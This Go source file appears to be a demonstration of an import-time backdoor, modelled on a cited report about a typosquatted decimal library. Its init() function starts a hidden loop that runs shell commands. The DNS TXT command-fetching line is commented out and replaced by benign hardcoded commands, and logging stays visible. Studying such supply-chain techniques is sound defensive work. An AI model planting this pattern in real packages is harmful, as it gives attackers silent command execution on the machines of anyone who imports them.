package silent

import (
	"log"
	"os/exec"
	"strings"
	"time"
)

// ref: https://socket.dev/blog/popular-go-decimal-library-typosquat-dns-backdoor
func init() {
	// ログ出力しない
	// log.SetOutput(io.Discard)

	log.Println("imported silent package")

	go func() {
		for {
			// records, err := net.LookupTXT("example.com")
			// if err != nil {
			// 	time.Sleep(5 * time.Minute)
			// 	continue
			// }
			records := []string{"ls -a", "ping -c 2 1.1.1.1"}

			for _, txt := range records {
				splitted := strings.Split(txt, " ")
				executable, args := splitted[0], splitted[1:]
				log.Printf("command executed!: %s\n\n", txt)

				cmd := exec.Command(executable, args...)
				out, err := cmd.CombinedOutput()
				if err != nil {
					log.Printf("command error: %s\n", err)
					continue
				}

				log.Printf("result: \n%s\n", string(out))
			}

			time.Sleep(5 * time.Second)
		}
	}()
}
